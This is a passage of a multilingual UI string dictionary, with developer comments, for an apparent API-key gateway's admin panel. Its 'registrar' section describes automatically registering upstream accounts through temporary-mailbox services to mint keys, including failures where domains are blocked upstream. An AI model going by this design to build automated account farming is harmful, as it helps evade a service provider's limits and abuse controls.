admin token (ADMIN_TOKEN)\", ja: \"管理トークン（ADMIN_TOKEN）を入力してください\", ko: \"관리 토큰(ADMIN_TOKEN)을 입력하세요\" },\n  \"gate.label\":       { \"zh-CN\": \"管理口令\", \"zh-TW\": \"管理口令\", en: \"Admin token\", ja: \"管理トークン\", ko: \"관리 토큰\" },\n  \"gate.placeholder\": { \"zh-CN\": \"ADMIN_TOKEN\", \"zh-TW\": \"ADMIN_TOKEN\", en: \"ADMIN_TOKEN\", ja: \"ADMIN_TOKEN\", ko: \"ADMIN_TOKEN\" },\n  \"gate.submit\":      { \"zh-CN\": \"进入\", \"zh-TW\": \"進入\", en: \"Enter\", ja: \"入る\", ko: \"들어가기\" },\n  \"gate.empty\":       { \"zh-CN\": \"请输入管理口令\", \"zh-TW\": \"請輸入管理口令\", en: \"Please enter the admin token\", ja: \"管理トークンを入力してください\", ko: \"관리 토큰을 입력하세요\" },\n  \"gate.invalid\":     { \"zh-CN\": \"口令无效\", \"zh-TW\": \"口令無效\", en: \"Invalid token\", ja: \"トークンが無効です\", ko: \"토큰이 올바르지 않습니다\" },\n  \"gate.badShape\":    { \"zh-CN\": \"这个口令里有不被接受的字符。只允许可打印 ASCII（0x20–0x7E）：汉字 / emoji / 零宽空格这类字符浏览器根本发不出去；é / £ 这类字符其实发得出去，但本网关出于跨运行时编码的稳健性考虑同样不接受。请检查环境变量里的 ADMIN_TOKEN。\", \"zh-TW\": \"這個口令裡有不被接受的字元。只允許可列印 ASCII（0x20–0x7E）：漢字 / emoji / 零寬空格這類字元瀏覽器根本送不出去；é / £ 這類字元其實送得出去，但本網關基於跨執行時編碼的穩健性考量同樣不接受。請檢查環境變數裡的 ADMIN_TOKEN。\", en: \"This token contains characters that are not accepted. Only printable ASCII (0x20–0x7E) is allowed: CJK characters, emoji and zero-width spaces simply cannot be sent by the browser, while characters like é or £ can be sent but are still rejected here as a cross-runtime encoding robustness choice. Check ADMIN_TOKEN in your environment.\", ja: \"このトークンには受け付けられない文字が含まれています。使用できるのは印字可能な ASCII（0x20–0x7E）のみです: 漢字・emoji・ゼロ幅スペースはブラウザーがそもそも送信できません。é や £ のような文字は送信自体は可能ですが、ランタイム間のエンコーディングに関する堅牢性の判断としてここでは受け付けていません。環境変数の ADMIN_TOKEN を確認してください。\", ko: \"이 토큰에는 허용되지 않는 문자가 있습니다. 출력 가능한 ASCII(0x20–0x7E)만 사용할 수 있습니다: 한자 / 이모지 / 폭 없는 공백은 브라우저가 아예 보낼 수 없고, é 나 £ 같은 문자는 보낼 수는 있지만 런타임 간 인코딩 견고성을 위한 선택으로 여기서는 받지 않습니다. 환경 변수의 ADMIN_TOKEN을 확인하세요.\" },\n  \"gate.network\":     { \"zh-CN\": \"网络错误，请稍后重试\", \"zh-TW\": \"網路錯誤，請稍後重試\", en: \"Network error, please retry\", ja: \"ネットワークエラーです。しばらくしてから再試行してください\", ko: \"네트워크 오류입니다. 잠시 후 다시 시도하세요\" },\n  \"gate.httpError\":   { \"zh-CN\": \"接口异常：{status}\", \"zh-TW\": \"介面異常：{status}\", en: \"Request failed: {status}\", ja: \"リクエスト失敗: {status}\", ko: \"요청 실패: {status}\" },\n\n  // ── 外壳 ─────────────────────────────────────────────────\n  \"nav.overview\":     { \"zh-CN\": \"概览\", \"zh-TW\": \"概覽\", en: \"Overview\", ja: \"概要\", ko: \"개요\" },\n  \"nav.keys\":         { \"zh-CN\": \"Key 池\", \"zh-TW\": \"Key 池\", en: \"Key pool\", ja: \"キープール\", ko: \"키 풀\" },\n  // ⚠️ 导航项刻意放在 `nav.*` 而不是 `reg.*`：`reg.*` 是禁用词门禁的作用域，\n  // 而那道门禁管的是「两条邮箱通道有没有被暗示成有高下」，与一个板块名无关。\n  \"nav.registrar\":    { \"zh-CN\": \"注册机\", \"zh-TW\": \"註冊機\", en: \"Registrar\", ja: \"レジストラー\", ko: \"등록기\" },\n  \"nav.events\":       { \"zh-CN\": \"事件\", \"zh-TW\": \"事件\", en: \"Events\", ja: \"イベント\", ko: \"이벤트\" },\n  // ⚠️ 与 `nav.registrar` 同一条理由，放 `nav.*` 而不是 `usage.*`：命名空间在这里\n  // 表示的是「壳层导航」，与板块内部的文案分开。\n  \"nav.usage\":        { \"zh-CN\": \"用量\", \"zh-TW\": \"用量\", en: \"Usage\", ja: \"使用量\", ko: \"사용량\" },\n  // ⚠️ 与 `nav.registrar` 同一条理由，放 `nav.*` 而不是 `models.*`：命名空间在这里\n  // 表示的是「壳层导航」，与板块内部的文案分开。\n  \"nav.models\":       { \"zh-CN\": \"模型\", \"zh-TW\": \"模型\", en: \"Models\", ja: \"モデル\", ko: \"모델\" },\n  // ⚠️ 与 `nav.registrar` 同一条理由，放 `nav.*` 而不是 `pg.*`：命名空间在这里\n  // 表示的是「壳层导航」，与板块内部的文案分开。\n  \"nav.playground\":   { \"zh-CN\": \"调试台\", \"zh-TW\": \"偵錯台\", en: \"Playground\", ja: \"プレイグラウンド\", ko: \"플레이그라운드\" },\n  // ⚠️ 与 `nav.registrar` 同一条理由，放 `nav.*` 而不是 `set.*`：命名空间在这里\n  // 表示的是「壳层导航」，与板块内部的文案分开。\n  \"nav.settings\":     { \"zh-CN\": \"设置\", \"zh-TW\": \"設定\", en: \"Settings\", ja: \"設定\", ko: \"설정\" },\n  \"shell.logout\":     { \"zh-CN\": \"退出登录\", \"zh-TW\": \"登出\", en: \"Sign out\", ja: \"ログアウト\", ko: \"로그아웃\" },\n  \"shell.theme\":      { \"zh-CN\": \"切换主题\", \"zh-TW\": \"切換主題\", en: \"Toggle theme\", ja: \"テーマ切り替え\", ko: \"테마 전환\" },\n  \"shell.lang\":       { \"zh-CN\": \"语言\", \"zh-TW\": \"語言\", en: \"Language\", ja: \"言語\", ko: \"언어\" },\n  \"common.dash\":      { \"zh-CN\": \"—\", \"zh-TW\": \"—\", en: \"—\", ja: \"—\", ko: \"—\" },\n  \"common.refresh\":   { \"zh-CN\": \"刷新\", \"zh-TW\": \"重新整理\", en: \"Refresh\", ja: \"更新\", ko: \"새로고침\" },\n  \"common.loadFailed\":{ \"zh-CN\": \"读取失败，显示为 —\", \"zh-TW\": \"讀取失敗，顯示為 —\", en: \"Failed to load; shown as —\", ja: \"取得に失敗しました（— と表示）\", ko: \"불러오기 실패(—로 표시)\" },\n  \"common.approx\":    { \"zh-CN\": \"近似值\", \"zh-TW\": \"近似值\", en: \"Approximate\", ja: \"概算値\", ko: \"근사값\" },\n  \"common.copy\":      { \"zh-CN\": \"复制\", \"zh-TW\": \"複製\", en: \"Copy\", ja: \"コピー\", ko: \"복사\" },\n  \"common.copied\":    { \"zh-CN\": \"已复制\", \"zh-TW\": \"已複製\", en: \"Copied\", ja: \"コピーしました\", ko: \"복사했습니다\" },\n  \"common.copyFailed\":{ \"zh-CN\": \"复制失败\", \"zh-TW\": \"複製失敗\", en: \"Copy failed\", ja: \"コピーに失敗しました\", ko: \"복사에 실패했습니다\" },\n  \"common.cancel\":    { \"zh-CN\": \"取消\", \"zh-TW\": \"取消\", en: \"Cancel\", ja: \"キャンセル\", ko: \"취소\" },\n  \"common.confirm\":   { \"zh-CN\": \"确定\", \"zh-TW\": \"確定\", en: \"Confirm\", ja: \"確認\", ko: \"확인\" },\n  // 需要手动关闭的 toast 上那颗「×」按钮的无障碍标签（P3c Task 4：批量操作部分\n  // 失败这类信息不自动消失，见 js/ui.js 的 toast() 说明）。\n  \"common.dismiss\":   { \"zh-CN\": \"关闭提示\", \"zh-TW\": \"關閉提示\", en: \"Dismiss\", ja: \"閉じる\", ko: \"닫기\" },\n  \"common.sessionExpired\": { \"zh-CN\": \"会话已过期，请重新输入管理口令\", \"zh-TW\": \"工作階段已過期，請重新輸入管理口令\", en: \"Session expired, please sign in again\", ja: \"セッションが失効しました。再度サインインしてください\", ko: \"세션이 만료되었습니다. 다시 로그인하세요\" },\n\n  // ── 补池失败归因（P3c 的注册机板块才渲染；本期先把键写齐，好让门禁从第一天就是活的）──\n  \"reg.fail.domain_blocked_all\": { \"zh-CN\": \"所有域名都被上游拦下\", \"zh-TW\": \"所有網域都被上游擋下\", en: \"Every domain was blocked upstream\", ja: \"すべてのドメインが上流でブロックされました\", ko: \"모든 도메인이 업스트림에서 차단되었습니다\" },\n  \"reg.fail.upstream_error\":     { \"zh-CN\": \"上游返回错误\", \"zh-TW\": \"上游回傳錯誤\", en: \"Upstream returned an error\", ja: \"上流がエラーを返しました\", ko: \"업스트림이 오류를 반환했습니다\" },\n  \"reg.fail.code_timeout\":       { \"zh-CN\": \"等验证码超时\", \"zh-TW\": \"等驗證碼逾時\", en: \"Timed out waiting for the verification code\", ja: \"認証コードの待機がタイムアウトしました\", ko: \"인증 코드 대기 시간이 초과되었습니다\" },\n  \"reg.fail.register_failed\":    { \"zh-CN\": \"注册这一步失败\", \"zh-TW\": \"註冊這一步失敗\", en: \"Registration step failed\", ja: \"登録ステップが失敗しました\", ko: \"가입 단계가 실패했습니다\" },\n  \"reg.fail.login_failed\":       { \"zh-CN\": \"登录这一步失败\", \"zh-TW\": \"登入這一步失敗\", en: \"Login step failed\", ja: \"ログインステップが失敗しました\", ko: \"로그인 단계가 실패했습니다\" },\n  \"reg.fail.key_failed\":         { \"zh-CN\": \"取 key 这一步失败\", \"zh-TW\": \"取 key 這一步失敗\", en: \"Key issuance step failed\", ja: \"キー取得ステップが失敗しました\", ko: \"키 발급 단계가 실패했습니다\" },\n  \"reg.fail.provider_error\":     { \"zh-CN\": \"邮箱通道报错\", \"zh-TW\": \"郵箱通道報錯\", en: \"The mailbox channel returned an error\", ja: \"メールボックスチャネルがエラーを返しました\", ko: \"메일박스 채널이 오류를 반환했습니다\" },\n  \"reg.fail.network_error\":      { \"zh-CN\": \"网络错误\", \"zh-TW\": \"網路錯誤\", en: \"Network error\", ja: \"ネットワークエラー\", ko: \"네트워크 오류\" },\n  \"reg.fail.rate_limited\":       { \"zh-CN\": \"被上游限流\", \"zh-TW\": \"被上游限流\", en: \"Rate limited upstream\", ja: \"上流でレート制限されました\", ko: \"업스트림에서 속도 제한되었습니다\" },\n  // 评审 C1：整轮抛错。它不是一次铸 key 失败，是「这一轮根本没跑完」——\n  // 加它是为了让崩掉的那一轮在补池历史的时间线上**占一格**，而不是与\n  // 「注册机根本没跑」长得一模一样。\n  \"reg.fail.round_crashed\": { \"zh-CN\": \"整轮补池抛错中断\", \"zh-TW\": \"整輪補池拋錯中斷\", en: \"The whole tend round threw and was aborted\", ja: \"補充ラウンド全体が例外で中断しました\", ko: \"보충 라운드 전체가 예외로 중단되었습니다\" },\n  \"reg.fail.provider_missing\":   { \"zh-CN\": \"这条通道没有配好凭据，未构造出提供方\", \"zh-TW\": \"這條通道沒有配好憑據，未建立提供方\", en: \"This channel has no credentials configured, so no provider was constructed\", ja: \"このチャネルは資格情報が未設定のため、プロバイダーが構築されませんでした\", ko: \"이 채널에 자격 증명이 없어 공급자가 생성되지 않았습니다\" },\n  // ⚠️ P3c Task 5：这一条**不是失败**——那一轮真的铸出来了（`minted` 照常 +1，\n  // 上游账号与临时邮箱都真的花掉了），只是发回来的 key 材料含不可打印字符或空白。\n  // 它照常存进池子（拒收 = 销毁凭据），但多半每次被选中都会让转发失败。\n  // 五种语言的措辞都必须说清「已存下来 + 请去处理它」，不许写成「铸失败了」。\n  \"reg.fail.key_suspicious\": { \"zh-CN\": \"铸出来的 key 材料可疑（已存入池子，请手动停用或删除）\", \"zh-TW\": \"鑄出來的 key 材料可疑（已存入池子，請手動停用或刪除）\", en: \"The minted key material looks malformed (stored in the pool anyway — disable or delete it)\", ja: \"発行されたキーの内容が不正に見えます（プールには保存済み — 無効化または削除してください）\", ko: \"발급된 키 내용이 손상된 것으로 보입니다(풀에는 저장되었으니 비활성화하거나 삭제하세요)\" },\n\n  // ── 注册机板块（P3c Task 6）───────────────────────────────────────────────\n  //\n  // ⚠️⚠️ **整个 `reg.*` 命名空间受禁用词门禁管**（`scripts/check-i18n.mjs` 第 ⑥ 条 +\n  // `tests/unit/i18n-dict.test.ts` 那条同名断言，两份独立实现）：\n  // `推荐/推薦/建议/建議/默认/預设/預設/主流/首选/首選/优先/優先/recommended/\n  // preferred/default/おすすめ/推奨/권장/기본` 一个都不许出现，**繁体变体与\n  // 韩语的「기본」尤其容易误踩**（「기본 채널」= primary channel 的自然译法，\n  // 这里一律改成「주 채널」）。\n  //\n  // ⚠️⚠️ **设计 §10.3 第 5 条给的原句「本就不存在默认地址」自己就踩了第 4 条的\n  // 禁用词表**（「默认」在表里，繁体「預設」同样在表里）。两条设计规则互相打架，\n  // 本任务按第 4 条执行（它是 CI 门禁，第 5 条只能靠评审），语义原样保住、\n  // 换成「没有可以预填的地址」。判据与理由见\n  // `admin-ui/js/pure/registrar.mjs` 的 `channelAddressFactKey()`。\n  \"reg.title\":        { \"zh-CN\": \"注册机\", \"zh-TW\": \"註冊機\", en: \"Registrar\", ja: \"レジストラー\", ko: \"등록기\" },\n  \"reg.state\":        { \"zh-CN\": \"注册机\", \"zh-TW\": \"註冊機\", en: \"Registrar\", ja: \"レジストラー\", ko: \"등록기\" },\n  \"reg.state.on\":     { \"zh-CN\": \"已启用\", \"zh-TW\": \"已啟用\", en: \"Enabled\", ja: \"有効\", ko: \"사용 중\" },\n  \"reg.state.off\":    { \"zh-CN\": \"已关闭\", \"zh-TW\": \"已關閉\", en: \"Disabled\", ja: \"無効\", ko: \"꺼짐\" },\n  \"reg.primary\":      { \"zh-CN\": \"主通道\", \"zh-TW\": \"主通道\", en: \"Primary channel\", ja: \"プライマリチャネル\", ko: \"주 채널\" },\n  \"reg.fallback\":     { \"zh-CN\": \"备用通道\", \"zh-TW\": \"備用通道\", en: \"Fallback channel\", ja: \"フォールバックチャネル\", ko: \"대체 채널\" },\n  \"reg.none\":         { \"zh-CN\": \"未选择\", \"zh-TW\": \"未選擇\", en: \"Not selected\", ja: \"未選択\", ko: \"선택 안 됨\" },\n  // 设计 §10.3 第 8 条逐字：空状态说「两条通道平级，请选择一条作为主通道」，\n  // **不是**「未选择时使用 X」。\n  \"reg.emptyPrimary\": { \"zh-CN\": \"两条通道平级，请选择一条作为主通道。\", \"zh-TW\": \"兩條通道平級，請選擇一條作為主通道。\", en: \"The two channels rank equally — pick one as the primary channel.\", ja: \"2 つのチャネルは対等です。どちらか一方をプライマリチャネルとして選んでください。\", ko: \"두 채널은 동등합니다. 둘 중 하나를 주 채널로 선택하세요.\" },\n\n  \"reg.pool.target\":  { \"zh-CN\": \"目标 key 数\", \"zh-TW\": \"目標 key 數\", en: \"Target key count\", ja: \"目標 key 数\", ko: \"목표 key 수\" },\n  // ⚠️ **这一格不叫「可用」，理由在 `src/core/registrar/tender.ts` 的 `available` 字段上**：\n  // 判据是 `countsTowardTarget`（`!evicted`），被停用的与正在冷却的 key **都算在里面**，\n  // 而这两种恰恰都不能打上游。旁边那格 `reg.pool.fresh` 才是真正的可用数。\n  \"reg.pool.counted\": { \"zh-CN\": \"占名额\", \"zh-TW\": \"佔名額\", en: \"Counted toward target\", ja: \"枠を占有\", ko: \"정원 차지\" },\n  \"reg.pool.countedTip\": { \"zh-CN\": \"补池算缺口用的就是这个数：判据只有「没被剔除」，所以被停用的 key 与正在冷却的 key 都算在里面——它们都占着目标名额，但都不能打上游。\", \"zh-TW\": \"補池算缺口用的就是這個數：判據只有「沒被剔除」，所以被停用的 key 與正在冷卻的 key 都算在裡面——它們都佔著目標名額，但都不能打上游。\", en: \"This is the number the refill loop uses to compute the gap. The test is only \\\"not evicted\\\", so disabled keys and cooling keys are both counted here — they occupy a slot yet cannot serve traffic.\", ja: \"補充ラウンドが不足数を計算するのに使う値です。判定は「除外されていない」だけなので、無効化済みの key もクールダウン中の key もここに含まれます——どちらも枠を占有しますが、上流には使えません。\", ko: \"보충 라운드가 부족분을 계산할 때 쓰는 값입니다. 판정은 「제외되지 않음」뿐이라 정지된 key와 쿨다운 중인 key가 모두 포함됩니다 — 둘 다 정원을 차지하지만 업스트림에는 쓸 수 없습니다.\" },\n  \"reg.pool.gap\":     { \"zh-CN\": \"缺口\", \"zh-TW\": \"缺口\", en: \"Gap\", ja: \"不足\", ko: \"부족분\" },\n  \"reg.pool.fresh\":   { \"zh-CN\": \"可用（能打上游）\", \"zh-TW\": \"可用（能打上游）\", en: \"Available (can serve traffic)\", ja: \"利用可能（上流に使える）\", ko: \"사용 가능(업스트림 가능)\" },\n\n  \"reg.channels.title\": { \"zh-CN\": \"邮箱通道\", \"zh-TW\": \"郵箱通道\", en: \"Mailbox channels\", ja: \"メールボックスチャネル\", ko: \"메일박스 채널\" },\n  \"reg.channel.moemail\": { \"zh-CN\": \"MoeMail\", \"zh-TW\": \"MoeMail\", en: \"MoeMail\", ja: \"MoeMail\", ko: \"MoeMail\" },\n  \"reg.channel.yyds\":    { \"zh-CN\": \"YYDS\", \"zh-TW\": \"YYDS\", en: \"YYDS\", ja: \"YYDS\", ko: \"YYDS\" },\n  // 设计 §10.3 第 5 条：两条通道之间**唯一**的不对称，必须写成事实而不是偏好。\n  // 「YYDS 开箱即用」是偏好，不许写。\n  \"reg.channel.addressFact.moemail\": { \"zh-CN\": \"自建服务：每个实例的地址都不一样，本就没有可以预填的地址，必须自己填。\", \"zh-TW\": \"自建服務：每個實例的位址都不一樣，本就沒有可以預先填入的位址，必須自己填。\", en: \"Self-hosted service: every instance lives at a different address, so there is no address to prefill — you provide it.\", ja: \"セルフホストのサービスです。インスタンスごとにアドレスが異なるため、あらかじめ入れておけるアドレスは存在しません。自分で指定してください。\", ko: \"직접 호스팅하는 서비스입니다. 인스턴스마다 주소가 달라 미리 채워 둘 주소가 존재하지 않으므로 직접 입력해야 합니다.\" },\n  \"reg.channel.addressFact.yyds\":    { \"zh-CN\": \"地址固定的公共服务：内置了一个地址，也可以自己改。\", \"zh-TW\": \"位址固定的公共服務：內建了一個位址，也可以自己改。\", en: \"Public service at a fixed address: one address ships with the gateway, and you can still override it.\", ja: \"アドレスが固定された公開サービスです。アドレスが 1 つ同梱されており、上書きもできます。\", ko: \"주소가 고정된 공개 서비스입니다. 주소 하나가 내장되어 있으며 직접 바꿀 수도 있습니다.\" },\n  \"reg.channel.role\":     { \"zh-CN\": \"角色\", \"zh-TW\": \"角色\", en: \"Role\", ja: \"役割\", ko: \"역할\" },\n  \"reg.role.primary\":     { \"zh-CN\": \"主通道\", \"zh-TW\": \"主通道\", en: \"Primary\", ja: \"プライマリ\", ko: \"주 채널\" },\n  \"reg.role.fallback\":    { \"zh-CN\": \"备用通道\", \"zh-TW\": \"備用通道\", en: \"Fallback\", ja: \"フォールバック\", ko: \"대체 채널\" },\n  \"reg.role.unused\":      { \"zh-CN\": \"本次配置没有用到它\", \"zh-TW\": \"本次設定沒有用到它\", en: \"Not used by the current configuration\", ja: \"現在の設定では使われていません\", ko: \"현재 설정에서는 사용되지 않습니다\" },\n  \"reg.channel.creds\":    { \"zh-CN\": \"凭据\", \"zh-TW\": \"憑證\", en: \"Credentials\", ja: \"資格情報\", ko: \"자격 증명\" },\n  \"reg.channel.credsYes\": { \"zh-CN\": \"已配好\", \"zh-TW\": \"已配好\", en: \"Configured\", ja: \"設定済み\", ko: \"설정됨\" },\n  \"reg.channel.credsNo\":  { \"zh-CN\": \"未配置\", \"zh-TW\": \"未設定\", en: \"Not configured\", ja: \"未設定\", ko: \"설정 안 됨\" },\n  // 设计 §10.3 第 6 条：用数据代替推荐——两个**等权**的按钮，返回可用域名数。\n  // P2 design §4.5：可用域名多寡是选主通道时唯一值得看的指标，与是哪家服务无关。\n  \"reg.channel.test\":     { \"zh-CN\": \"测试连接\", \"zh-TW\": \"測試連線\", en: \"Test connection\", ja: \"接続テスト\", ko: \"연결 테스트\" },\n  \"reg.channel.testing\":  { \"zh-CN\": \"测试中…\", \"zh-TW\": \"測試中…\", en: \"Testing…\", ja: \"テスト中…\", ko: \"테스트 중…\" },\n  \"reg.channel.testOk\":     { \"zh-CN\": \"连通：可用域名 {domains} 个 · 耗时 {latencyMs} ms\", \"zh-TW\": \"連通：可用網域 {domains} 個 · 耗時 {latencyMs} ms\", en: \"Reachable: {domains} usable domain(s) · {latencyMs} ms\", ja: \"接続できました: 利用可能なドメイン {domains} 件 · {latencyMs} ms\", ko: \"연결됨: 사용 가능한 도메인 {domains}개 · {latencyMs} ms\" },\n  \"reg.channel.testFailed\": { \"zh-CN\": \"没有连上（耗时 {latencyMs} ms）。详细原因在事件板块里，事件名 registrar.channel_test_failed。\", \"zh-TW\": \"沒有連上（耗時 {latencyMs} ms）。詳細原因在事件板塊裡，事件名 registrar.channel_test_failed。\", en: \"Could not connect ({latencyMs} ms). The details are in the Events section under registrar.channel_test_failed.\", ja: \"接続できませんでした（{latencyMs} ms）。詳細はイベントセクションの registrar.channel_test_failed を参照してください。\", ko: \"연결하지 못했습니다({latencyMs} ms). 자세한 내용은 이벤트 섹션의 registrar.channel_test_failed에 있습니다.\" },\n  \"reg.channel.testError\":  { \"zh-CN\": \"测试请求本身失败了，没有测到这条通道\", \"zh-TW\": \"測試請求本身失敗了，沒有測到這條通道\", en: \"The test request itself failed, so this channel was never reached\", ja: \"テストのリクエスト自体が失敗したため、このチャネルには到達していません\", ko: \"테스트 요청 자체가 실패해 이 채널에는 도달하지 못했습니다\" },\n  \"reg.channel.testHint\":   { \"zh-CN\": \"测试只读取这条通道的可用域名列表，不建邮箱、不注册账号，不消耗任何名额。\", \"zh-TW\": \"測試只讀取這條通道的可用網域清單，不建郵箱、不註冊帳號，不消耗任何名額。\", en: \"The test only reads this channel's list of usable domains: no mailbox is created, no account is registered, no quota is consumed.\", ja: \"テストはこのチャネルの利用可能ドメイン一覧を読むだけです。メールボックスの作成もアカウント登録も行わず、枠も消費しません。\", ko: \"테스트는 이 채널의 사용 가능한 도메인 목록만 읽습니다. 메일박스를 만들지도, 계정을 등록하지도, 정원을 소비하지도 않습니다.\" },\n\n  \"reg.tend.button\":       { \"zh-CN\": \"立即补池\", \"zh-TW\": \"立即補池\", en: \"Refill now\", ja: \"今すぐ補充\", ko: \"지금 보충\" },\n  \"reg.tend.confirmTitle\": { \"zh-CN\": \"确认立即补池\", \"zh-TW\": \"確認立即補池\", en: \"Confirm refill\", ja: \"補充の確認\", ko: \"보충 확인\" },\n  // 设计 §10.2 第 3 条护栏：确认弹窗必须明示消耗。\n  // ⚠️ **两个外部服务的活跃邮箱上限一律不写数字**：一个与账号档位绑定、一个是可被\n  // 实例覆盖的上游默认值，把当前取值印在面板上，运维会当成自己这套部署的事实。\n  // 完整理由见 `src/http/admin/handlers/registrar.ts` 的文件头。\n  \"reg.tend.confirmMsg\":   { \"zh-CN\": \"本次最多铸 {keys} 把 key，将消耗最多 {mailboxes} 个临时邮箱。两条通道各自的活跃邮箱上限请查各自服务商的文档。\", \"zh-TW\": \"本次最多鑄 {keys} 把 key，將消耗最多 {mailboxes} 個臨時郵箱。兩條通道各自的活躍郵箱上限請查各自服務商的文件。\", en: \"This run mints at most {keys} key(s) and consumes at most {mailboxes} temporary mailbox(es). For each channel's active-mailbox limit, check that provider's own documentation.\", ja: \"今回発行する key は最大 {keys} 件、消費する一時メールボックスは最大 {mailboxes} 件です。各チャネルのアクティブなメールボックス上限は、それぞれの提供元のドキュメントを確認してください。\", ko: \"이번 실행에서 최대 {keys}개의 key를 발급하고 최대 {mailboxes}개의 임시 메일박스를 사용합니다. 각 채널의 활성 메일박스 상한은 해당 제공자의 문서를 확인하세요.\" },\n  \"reg.tend.confirmUnknown\": { \"zh-CN\": \"读不到当前的缺口与单轮上限，这次会铸几把 key 说不准。请先刷新，确认状态之后再点。\", \"zh-TW\": \"讀不到目前的缺口與單輪上限，這次會鑄幾把 key 說不準。請先重新整理，確認狀態之後再點。\", en: \"The current gap and per-round ceiling could not be read, so how many keys this run mints is unknown. Refresh first and confirm the state before proceeding.\", ja: \"現在の不足数と 1 ラウンドの上限が読み取れないため、今回いくつ key を発行するかは不明です。まず更新して状態を確認してから実行してください。\", ko: \"현재 부족분과 라운드당 상한을 읽지 못해 이번에 key를 몇 개 발급할지 알 수 없습니다. 먼저 새로고침해 상태를 확인한 뒤 진행하세요.\" },\n  // 通道下拉：**初始为占位符，两条通道都不预选**（设计 §10.3 第 1 条同一条纪律）。\n  \"reg.tend.channelLabel\": { \"zh-CN\": \"用哪条通道\", \"zh-TW\": \"用哪條通道\", en: \"Which channel\", ja: \"使用するチャネル\", ko: \"사용할 채널\" },\n  \"reg.tend.channelAny\":   { \"zh-CN\": \"按当前配置的主 / 备通道\", \"zh-TW\": \"按目前設定的主 / 備通道\", en: \"Follow the configured primary / fallback chain\", ja: \"設定されているプライマリ／フォールバックの順に従う\", ko: \"설정된 주/대체 채널 순서를 따름\" },\n  \"reg.tend.started\":      { \"zh-CN\": \"已开始补池。结果会出现在下面的补池历史里——这颗按钮只负责发起，不等它跑完。\", \"zh-TW\": \"已開始補池。結果會出現在下面的補池歷史裡——這顆按鈕只負責發起，不等它跑完。\", en: \"Refill started. The result will show up in the refill history below — this button only kicks it off and does not wait for it to finish.\", ja: \"補充を開始しました。結果は下の補充履歴に表示されます——このボタンは開始するだけで、完了を待ちません。\", ko: \"보충을 시작했습니다. 결과는 아래 보충 기록에 표시됩니다 — 이 버튼은 시작만 할 뿐 완료를 기다리지 않습니다.\" },\n  \"reg.tend.failed\":       { \"zh-CN\": \"这次补池没有发起成功\", \"zh-TW\": \"這次補池沒有發起成功\", en: \"This refill was not started\", ja: \"今回の補充は開始できませんでした\", ko: \"이번 보충을 시작하지 못했습니다\" },\n  // 「今天还剩几次」**在点之前就要显示**，不是等到点不动了才说。\n  \"reg.tend.quota\":        { \"zh-CN\": \"今天还可以点 {remaining} 次（每天上限 {perDay} 次）\", \"zh-TW\": \"今天還可以點 {remaining} 次（每天上限 {perDay} 次）\", en: \"{remaining} more click(s) available today (daily cap {perDay})\", ja: \"本日はあと {remaining} 回押せます（1 日の上限 {perDay} 回）\", ko: \"오늘 {remaining}번 더 누를 수 있습니다(하루 상한 {perDay}회)\" },\n  \"reg.tend.quotaReset\":   { \"zh-CN\": \"，{at} 重置\", \"zh-TW\": \"，{at} 重置\", en: \", resets at {at}\", ja: \"、{at} にリセット\", ko: \", {at}에 초기화\" },\n  // ⚠️ **绝对时刻与相对时长成对给**：相对量做倒计时（免疫客户端时钟偏差），\n  // 绝对时刻显示「几点恢复」。绝不让面板拿本地时钟去减一个服务端时刻。\n  \"reg.tend.cooldown\":     { \"zh-CN\": \"冷却中：{at} 之后可以再点（还有 {left}）\", \"zh-TW\": \"冷卻中：{at} 之後可以再點（還有 {left}）\", en: \"Cooling down: available again at {at} (in {left})\", ja: \"クールダウン中: {at} 以降に再度実行できます（あと {left}）\", ko: \"쿨다운 중: {at} 이후 다시 누를 수 있습니다(남은 시간 {left})\" },\n  \"reg.locked\":            { \"zh-CN\": \"有一轮补池正在跑，持锁方声明最晚 {at} 结束\", \"zh-TW\": \"有一輪補池正在跑，持鎖方聲明最晚 {at} 結束\", en: \"A refill round is running; the lock holder declares it ends by {at} at the latest\", ja: \"補充ラウンドが実行中です。ロック保持側は遅くとも {at} には終わると宣言しています\", ko: \"보충 라운드가 실행 중입니다. 잠금 보유자는 늦어도 {at}에는 끝난다고 선언했습니다\" },\n\n  \"reg.history.title\":  { \"zh-CN\": \"补池历史\", \"zh-TW\": \"補池歷史\", en: \"Refill history\", ja: \"補充履歴\", ko: \"보충 기록\" },\n  \"reg.history.empty\":  { \"zh-CN\": \"还没有补池记录。\", \"zh-TW\": \"還沒有補池記錄。\", en: \"No refill rounds recorded yet.\", ja: \"補充ラウンドの記録はまだありません。\", ko: \"아직 보충 라운드 기록이 없습니다.\" },\n  \"reg.history.malformed\": { \"zh-CN\": \"存储里有 {count} 条读不得的补池记录被丢弃了，多半是存储被本网关之外的东西写过。\", \"zh-TW\": \"儲存裡有 {count} 條讀不得的補池記錄被丟棄了，多半是儲存被本閘道之外的東西寫過。\", en: \"{count} unreadable refill record(s) in storage were discarded — most likely storage was written by something other than this gateway.\", ja: \"ストレージ内の読み取れない補充記録 {count} 件を破棄しました。本ゲートウェイ以外から書き込まれた可能性が高いです。\", ko: \"저장소의 읽을 수 없는 보충 기록 {count}건을 버렸습니다. 이 게이트웨이 외부에서 기록되었을 가능성이 높습니다.\" },\n  \"reg.col.at\":       { \"zh-CN\": \"时间\", \"zh-TW\": \"時間\", en: \"Time\", ja: \"時刻\", ko: \"시각\" },\n  \"reg.col.trigger\":  { \"zh-CN\": \"触发\", \"zh-TW\": \"觸發\", en: \"Trigger\", ja: \"トリガー\", ko: \"트리거\" },\n  \"reg.col.channel\":  { \"zh-CN\": \"这一轮的通道\", \"zh-TW\": \"這一輪的通道\", en: \"Channel this round\", ja: \"このラウンドのチャネル\", ko: \"이 라운드의 채널\" },\n  \"reg.col.result\":   { \"zh-CN\": \"结果\", \"zh-TW\": \"結果\", en: \"Result\", ja: \"結果\", ko: \"결과\" },\n  \"reg.col.duration\": { \"zh-CN\": \"耗时\", \"zh-TW\": \"耗時\", en: \"Duration\", ja: \"所要時間\", ko: \"소요 시간\" },\n  \"reg.col.failures\": { \"zh-CN\": \"失败归因\", \"zh-TW\": \"失敗歸因\", en: \"Failure reasons\", ja: \"失敗の内訳\", ko: \"실패 원인\" },\n  \"reg.trigger.cron\":   { \"zh-CN\": \"定时\", \"zh-TW\": \"定時\", en: \"Scheduled\", ja: \"定期実行\", ko: \"예약 실행\" },\n  \"reg.trigger.manual\": { \"zh-CN\": \"面板\", \"zh-TW\": \"面板\", en: \"Panel\", ja: \"パネル\", ko: \"패널\" },\n  // 四种形态的判据来自 `src/core/registrar/tender.ts` 里 `mintedByChannel` 上那张表：\n  // `skipped` + `attempted` + `failures` 